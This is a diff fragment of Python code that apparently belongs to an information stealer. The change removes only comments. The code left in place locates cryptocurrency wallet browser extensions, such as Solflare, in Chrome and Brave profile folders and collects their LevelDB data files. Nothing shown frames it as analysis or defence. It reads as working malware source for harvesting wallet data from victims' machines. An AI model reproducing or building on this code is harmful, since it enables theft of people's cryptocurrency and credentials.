@@ -18,7 +18,6 @@ def grab_wallet_extensions():
         "Solflare": "bhhhlbpeboebidndecjhdocciaebndme"
     }
     
-    # Potential browser extension locations
     browsers = {
         "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
         "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
@@ -42,7 +41,6 @@ def grab_wallet_extensions():
             for w_name, w_id in extension_targets.items():
                 target_ext_dir = os.path.join(ext_path, w_id)
                 if os.path.exists(target_ext_dir):
-                    # Found a wallet! Grab LevelDB files
                     for root, dirs, files in os.walk(target_ext_dir):
                         for file in files:
                             file_path = os.path.join(root, file)
@@ -64,7 +62,6 @@ def grab_wallet_extensions():
     except: return None
 
 def get_wallet_ext_report():
-    # Simple list of what was found
     found = set()
     local = os.getenv('LOCALAPPDATA')
     extension_targets = {
